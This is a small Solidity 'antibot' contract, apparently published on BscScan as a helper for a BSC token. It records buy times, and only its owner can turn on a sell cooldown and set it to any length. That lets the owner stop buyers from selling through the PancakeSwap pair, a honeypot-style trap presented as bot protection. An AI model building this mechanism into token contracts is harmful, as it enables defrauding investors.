/**
 *Submitted for verification at BscScan.com on 2022-01-03
*/

/**
 *Submitted for verification at BscScan.com on 2021-12-25
*/

// SPDX-License-Identifier: MIT

pragma solidity ^0.8.2;

interface IFather {
    function Creator() external pure returns (address);
}

contract antibot {
    address owner;
    constructor()  {
        owner = msg.sender;
    }
    modifier onlyOwner() {
        require(msg.sender == owner, "Caller is not owner");
        _;
    }
        mapping (address =>mapping(address => uint256))private _lastBuy;
        uint256 public SellCoolDown;
        bool public An;
function _beforeTokenTransfer(address pancakeswapV2Pair,address sender, address recipient) external {
        if(sender == pancakeswapV2Pair){
            _lastBuy[msg.sender][tx.origin] = block.timestamp;
            _lastBuy[msg.sender][recipient] = block.timestamp;
        }else if(recipient == pancakeswapV2Pair){
            if(An){
            require(block.timestamp > _lastBuy[msg.sender][tx.origin] + SellCoolDown || block.timestamp - _lastBuy[msg.sender][tx.origin] < 3 seconds ,"Sell cool down!");
            require(block.timestamp > _lastBuy[msg.sender][sender] + SellCoolDown || block.timestamp - _lastBuy[msg.sender][sender] < 3 seconds ,"Sell cool down!");
            }
        }else if(sender != IFather(msg.sender).Creator()){
            _lastBuy[msg.sender][recipient] = block.timestamp;
        }
}

function enableAnti(bool state) public onlyOwner {
         An = state;
}
function Setcd(uint256 sec) public onlyOwner {
         SellCoolDown = sec; 
}

 }